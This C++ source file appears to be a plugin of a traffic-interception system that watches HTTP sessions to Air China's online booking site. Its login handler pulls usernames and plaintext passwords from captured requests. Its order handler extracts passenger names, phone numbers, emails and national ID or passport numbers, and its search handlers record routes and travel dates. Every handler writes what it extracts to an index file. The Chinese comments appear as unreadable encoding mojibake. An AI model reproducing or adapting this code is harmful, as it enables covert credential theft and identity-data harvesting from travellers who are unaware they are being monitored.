
#include "StdAfx.h"
#include "PlaneAirChina.h"

plane::PlaneAirChina::PlaneAirChina(HttpSession *http_session, const string &pro_name) : Airplane(http_session,pro_name)
{
	
}

plane::PlaneAirChina::~PlaneAirChina()
{
	
}
		
// ID_CARD ���֤ 2.DOC ���գ�MI_CARD ����֤������֤��
string plane::PlaneAirChina::GetIdType(string idType)
{
	string idTypeTrue;
	if (idType == "ID_CARD"){idTypeTrue = "���֤";}
	if (idType == "2.DOC"){idTypeTrue = "����";}
	if (idType == "MI_CARD"){idTypeTrue = "����֤������֤��";}
	return idTypeTrue;
}

int plane::PlaneAirChina::IsPlaneAirChina(HttpSession *http_session)
{
	//��¼ �ǵ�¼ҳ��
	if((http_session->m_Requestline.m_Host.Find("et.airchina.com.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/InternetBooking/ReservationLogin.do")!=-1)) 
	{										
		return kpclogin;
	}	
	//���ڵ��� ���� 1 ��ҳ��ѯ
	if((http_session->m_Requestline.m_Host.Find("et.airchina.com.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/InternetBooking/AirLowFareSearchExt.do")!=-1)) 
	{										
		return kpcticket;
	}	
	//��� 1	��ҳ��ѯ
	if((http_session->m_Requestline.m_Host.Find("et.airchina.com.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/InternetBooking/AirAvailabilitySearchExt.do")!=-1))
	{
		return kpcticket;
	}
	//���ڵ��� ���� ��תҳ��ѯ
	if((http_session->m_Requestline.m_Host.Find("et.airchina.com.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/InternetBooking/ValidateFormAction.do")!=-1)) 
	{										
		return kpcticketsecond;
	}	
	//�ύ����
	if((http_session->m_Requestline.m_Host.Find("et.airchina.com.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/InternetBooking/UpdateReservation.do")!=-1) )
	{
		return kpcorder;
	}
	return 0;
}

int plane::PlaneAirChina::Process(const char *packet,int action)
{
	//��¼
	if (action == kpclogin)
	{
		return pclogin(packet);
	}
	//��ѯ ��ҳ
	if (action == kpcticket)
	{
		return pcticket(packet);
	}
	//��ѯ ��תҳ
	if(action == kpcticketsecond)
	{
		return pcticketsecond(packet);
	}
	//�ύ����
	if (action == kpcorder)
	{
		return pcorder(packet);
	}
	return 1;
}

//��¼
int plane::PlaneAirChina::pclogin(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');

	//��¼����
	string usernameType = ms_->GetValueFromMapByKey("usernameType",true);
	//�˺�
	string username = ms_->GetValueFromMapByKey("username",true);
	//����
	string password = ms_->GetValueFromMapByKey("password",true);
	if (username.empty() && password.empty())
	{
		return 0;
	}
	output_text_ =
		"user=" + username + "\r\n" + //�˺�
		"pass=" + password + "\r\n" + //����
		"state=��¼\r\n";
	WriteIndexFile();
	return 1;
}
//���� ���� ���� ���� ��ҳ
int plane::PlaneAirChina::pcticket(const char *packet)
{	
	//��uri
	string Referer = http_session_->m_Requestline.m_Referer.GetBuffer(0);
	//���� ���� ���
	string tripTypeOw = "tripType=OW";
	string tripTypeRt = "tripType=RT";
	string tripTypeMc = "tripType=MC";
	if (Referer.find(tripTypeOw) != string::npos)
	{
		ms_->Replace(Referer, "?", "&");
		Referer = ms_->UTF8ToGBK(UrlDecode(Referer));
		ms_->SplitStringToMap(Referer,'&','=');
		//��������
		string adultCount = ms_->GetValueFromMapByKey("guestTypes[0].amount");
		//��ͯ����
		string childCount = ms_->GetValueFromMapByKey("guestTypes[1].amount");
		//Ӥ������
		string infantCount = ms_->GetValueFromMapByKey("guestTypes[2].amount");  
		//������
		string originLocation = ms_->GetValueFromMapByKey("outboundOption.originLocationCode",true);
		//Ŀ�ĵ�
		string destinationLocation = ms_->GetValueFromMapByKey("outboundOption.destinationLocationCode",true);
		//��������
		string departureDate = ms_->GetValueFromMapByKey("outboundOption.departureYear",true) + "-" + 
							   ms_->GetValueFromMapByKey("outboundOption.departureMonth",true) + "-" +
							   ms_->GetValueFromMapByKey("outboundOption.departureDay",true);
		output_text_ =
			"netmark=" + adultCount + "\r\n" +			//��������
			"onick=" + 	childCount + "\r\n" +			//��ͯ����
			"sex=" + 	infantCount + "\r\n" +			//Ӥ������
			"nick=" + 	originLocation + "\r\n" +		//������
			"msg=" + 	destinationLocation + "\r\n" +	//Ŀ�ĵ� 
			"servername=" + departureDate + "\r\n" +	//��������
			"state=��ѯ\r\n";
		WriteIndexFile();
	}
	if (Referer.find(tripTypeRt) != string::npos)
	{
		ms_->Replace(Referer, "?", "&");
		Referer = ms_->UTF8ToGBK(UrlDecode(Referer));
		ms_->SplitStringToMap(Referer,'&','=');
		//��������
		string adultCount = ms_->GetValueFromMapByKey("guestTypes[0].amount");
		//��ͯ����
		string childCount = ms_->GetValueFromMapByKey("guestTypes[1].amount");
		//Ӥ������
		string infantCount = ms_->GetValueFromMapByKey("guestTypes[2].amount");  
		//������
		string originLocation = ms_->GetValueFromMapByKey("outboundOption.originLocationCode",true);
		//Ŀ�ĵ�
		string destinationLocation = ms_->GetValueFromMapByKey("outboundOption.destinationLocationCode",true);
		//��������
		string departureDate = ms_->GetValueFromMapByKey("outboundOption.departureYear",true) + "-" + 
							   ms_->GetValueFromMapByKey("outboundOption.departureMonth",true) + "-" +
			                   ms_->GetValueFromMapByKey("outboundOption.departureDay",true);
		//��������
		string departureDateRt = ms_->GetValueFromMapByKey("inboundOption.departureYear",true) + "-" + 
							   ms_->GetValueFromMapByKey("inboundOption.departureMonth",true) + "-" +
							   ms_->GetValueFromMapByKey("inboundOption.departureDay",true);
		output_text_ =
			"netmark=" + adultCount + "\r\n" +			//��������
			"onick=" + 	childCount + "\r\n" +			//��ͯ����
			"sex=" + 	infantCount + "\r\n" +			//Ӥ������
			"nick=" + 	originLocation + "\r\n" +		//������
			"msg=" + 	destinationLocation + "\r\n" +	//Ŀ�ĵ� 
			"servername=" + departureDate + "\r\n" +	//��������
			"appname=" + departureDateRt + "\r\n" +		//��������
			"state=��ѯ\r\n";
		WriteIndexFile();
	}
	if (Referer.find(tripTypeMc) != string::npos)
	{
		//�������
		string tempCount = Referer.substr(Referer.rfind("multiCityOptions"),Referer.find("&guestTypes") - Referer.rfind("multiCityOptions"));
		tempCount = ms_->GetValueBetweenBeginEnd(tempCount,"[","]",true);
		int airCount = atoi(tempCount.c_str()); 

		ms_->Replace(Referer, "?", "&");
		Referer = ms_->UTF8ToGBK(UrlDecode(Referer));
		ms_->SplitStringToMap(Referer,'&','=');

		//��������
		string adultCount = ms_->GetValueFromMapByKey("guestTypes[0].amount");
		//��ͯ����
		string childCount = ms_->GetValueFromMapByKey("guestTypes[1].amount");
		//Ӥ������
		string infantCount = ms_->GetValueFromMapByKey("guestTypes[2].amount");  
		for (int i=0 ;i<=airCount ;i++)
		{
			CString nCount;
			nCount.Format("%d",i);
			string mCount = nCount.GetBuffer(0);
			//������
			string originLocationTemp = "multiCityOptions[" + mCount + "].originLocationCode";
			string originLocation = ms_->GetValueFromMapByKey(originLocationTemp,true);
			//Ŀ�ĵ�
			string destinationLocationTemp = "multiCityOptions[" + mCount + "].destinationLocationCode";
			string destinationLocation = ms_->GetValueFromMapByKey(destinationLocationTemp,true);
			//��������  multiCityOptions[0].departureYear
			string tempYear = "multiCityOptions[" + mCount + "].departureYear";
			string tempMonth = "multiCityOptions[" + mCount + "].departureMonth";
			string tempDay = "multiCityOptions[" + mCount + "].departureDay";
			string departureDate = ms_->GetValueFromMapByKey(tempYear,true) + "-" + 
									ms_->GetValueFromMapByKey(tempMonth,true) + "-" +
									ms_->GetValueFromMapByKey(tempDay,true);
			output_text_ =
				"netmark=" + adultCount + "\r\n" +			//��������
				"onick=" + 	childCount + "\r\n" +			//��ͯ����
				"sex=" + 	infantCount + "\r\n" +			//Ӥ������
				"nick=" + 	originLocation + "\r\n" +		//������
				"msg=" + 	destinationLocation + "\r\n" +	//Ŀ�ĵ� 
				"servername=" + departureDate + "\r\n" +	//��������
				"state=��ѯ\r\n";
			WriteIndexFile();
		}
	}
	return 1;
}


//���� ���� ���� ���� ��תҳ
int plane::PlaneAirChina::pcticketsecond(const char *packet)
{	
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	string tripType = ms_->GetValueFromMapByKey("tripType",true);
	//����
	if (tripType == "OW")
	{
		//��������
		string adultCount = ms_->GetValueFromMapByKey("guestTypes[0].amount");
		//��ͯ����
		string childCount = ms_->GetValueFromMapByKey("guestTypes[1].amount");
		//Ӥ������
		string infantCount = ms_->GetValueFromMapByKey("guestTypes[2].amount");  
		//������
		string originLocation = ms_->GetValueFromMapByKey("outboundOption.originLocationCode",true);
		//Ŀ�ĵ�
		string destinationLocation = ms_->GetValueFromMapByKey("outboundOption.destinationLocationCode",true);
		//��������
		string departureDate = ms_->GetValueFromMapByKey("outboundOption.departureYear",true) + "-" + 
							   ms_->GetValueFromMapByKey("outboundOption.departureMonth",true) + "-" +
							   ms_->GetValueFromMapByKey("outboundOption.departureDay",true);
		output_text_ =
			"netmark=" + adultCount + "\r\n" +			//��������
			"onick=" + 	childCount + "\r\n" +			//��ͯ����
			"sex=" + 	infantCount + "\r\n" +			//Ӥ������
			"nick=" + 	originLocation + "\r\n" +		//������
			"msg=" + 	destinationLocation + "\r\n" +	//Ŀ�ĵ� 
			"servername=" + departureDate + "\r\n" +	//��������
			"state=��ѯ\r\n";
		WriteIndexFile();
	}
	if (tripType == "RT")
	{
		//��������
		string adultCount = ms_->GetValueFromMapByKey("guestTypes[0].amount");
		//��ͯ����
		string childCount = ms_->GetValueFromMapByKey("guestTypes[1].amount");
		//Ӥ������
		string infantCount = ms_->GetValueFromMapByKey("guestTypes[2].amount");  
		//������
		string originLocation = ms_->GetValueFromMapByKey("outboundOption.originLocationCode",true);
		//Ŀ�ĵ�
		string destinationLocation = ms_->GetValueFromMapByKey("outboundOption.destinationLocationCode",true);
		//��������
		string departureDate = ms_->GetValueFromMapByKey("outboundOption.departureYear",true) + "-" + 
							   ms_->GetValueFromMapByKey("outboundOption.departureMonth",true) + "-" +
			                   ms_->GetValueFromMapByKey("outboundOption.departureDay",true);
		//��������
		string departureDateRt = ms_->GetValueFromMapByKey("inboundOption.departureYear",true) + "-" + 
							   ms_->GetValueFromMapByKey("inboundOption.departureMonth",true) + "-" +
							   ms_->GetValueFromMapByKey("inboundOption.departureDay",true);
		output_text_ =
			"netmark=" + 	adultCount + "\r\n" +		//��������
			"onick=" + 	childCount + "\r\n" +			//��ͯ����
			"sex=" + 	infantCount + "\r\n" +			//Ӥ������
			"nick=" + 	originLocation + "\r\n" +		//������
			"msg=" + 	destinationLocation + "\r\n" +	//Ŀ�ĵ� 
			"servername=" + departureDate + "\r\n" +	//��������
			"appname=" + 	departureDateRt + "\r\n" +	//��������
			"state=��ѯ\r\n";
		WriteIndexFile();
	}
	return 1;
}

//�ύ����
int plane::PlaneAirChina::pcorder(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//��ϵ����Ϣ
	string contactName,contactMobile,contackEmail;
	contactName = ms_->GetValueFromMapByKey("travelArranger.lastName",true) + ms_->GetValueFromMapByKey("travelArranger.firstName",true);	
	contactMobile = ms_->GetValueFromMapByKey("travellersInfo[0].mobilePhone.phoneNumber",true);
	contackEmail = ms_->GetValueFromMapByKey("travellersInfo[0].emailAddress",true);
	//�˿���Ϣ 
	string passengerName,passengerIDtypeTemp,passengerIDtype,passengerIDcard,passengerTel;
	//�˿�����
	string travellersCount = ms_->GetValueFromMapByKey("travellersCount",true);
	int passengerCount = atoi(travellersCount.c_str());
	
	for(int i=0 ;i<passengerCount ;i++)
	{
		CString tempStr;
		tempStr.Format("%d",i);
		string tempStrCount = tempStr.GetBuffer(0);
		//�˿�����
		string passengerNameTemp1 = "travellersInfo[" + tempStrCount + "].lastName";	
		string passengerNameTemp2 = "travellersInfo[" + tempStrCount + "].firstName";
		passengerName = ms_->GetValueFromMapByKey(passengerNameTemp1,true) + ms_->GetValueFromMapByKey(passengerNameTemp2,true);
		//�˿͵绰
		string passengerTelTemp = "travellersInfo[" + tempStrCount + "].personalPhone.phoneNumber";
		passengerTel = ms_->GetValueFromMapByKey(passengerTelTemp,true);
		//�˿�֤������
		string passengerIDtypeTemp = "travellersInfo[" + tempStrCount + "].advancedPassengerDetails(foid)";
		passengerIDtype = ms_->GetValueFromMapByKey(passengerIDtypeTemp,true);
		passengerIDtype = GetIdType(passengerIDtype);
		//�˿�֤����
		string passengerIDcardTemp = "travellersInfo[" + tempStrCount + "].advancedPassengerDetails(foidNumber)";
		passengerIDcard = ms_->GetValueFromMapByKey(passengerIDcardTemp,true);

		output_text_ =
			"mid=" + 	contactName + "\r\n" +		//��ϵ������
			"oid=" + 	contactMobile + "\r\n" +	//��ϵ�˵绰
			"imsi=" + 	contackEmail + "\r\n" +		//��ϵ������
			"msgtype=" + passengerName + "\r\n" +	//�˿�����
			"clientmsg=" + passengerTel + "\r\n" +	//�˿͵绰
			"webname=" + passengerIDtype + "\r\n" + //�˿�֤������
			"subject=" + passengerIDcard + "\r\n" + //�˿�֤����
			"state=�ύ����\r\n";
		WriteIndexFile();
	}
	return 1;
}
